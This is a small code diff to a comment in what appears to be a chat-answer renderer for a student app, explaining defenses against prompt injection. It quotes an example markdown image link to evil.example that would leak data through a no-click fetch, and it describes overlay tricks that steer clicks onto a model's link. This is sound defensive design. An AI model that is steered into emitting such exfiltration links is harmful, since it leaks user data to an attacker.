@@ -13,14 +13,14 @@ marked.setOptions({ gfm: true, breaks: false });
 /**
  * Answers now come from a real model, and a page can try to steer a model
  * (prompt injection). Three consequences for what we render:
- * - Links open in a new tab. Followed in place, a link would navigate the
- *   side panel itself away from the extension.
+ * - Links open in the student's browser (platform/links.ts). Followed in
+ *   place, a link would navigate the panel itself away from the app.
  * - Nothing is fetched. `![](https://evil.example/?q=…)`, a CSS
  *   `url(…)`, a `background` attribute or an SVG/MathML image would make the
  *   panel fetch a URL of the model's choosing with no click, carrying
  *   whatever it was talked into putting there. Answers are text and KaTeX;
  *   nothing needs a remote resource. (The pages' CSP refuses remote images
- *   too: wxt.config.ts.)
+ *   too: src-tauri/tauri.conf.json.)
  * - An answer stays in its box: no fixed or absolute layers drawn over the
  *   rest of the panel, where a click would land on the model's link.
  */
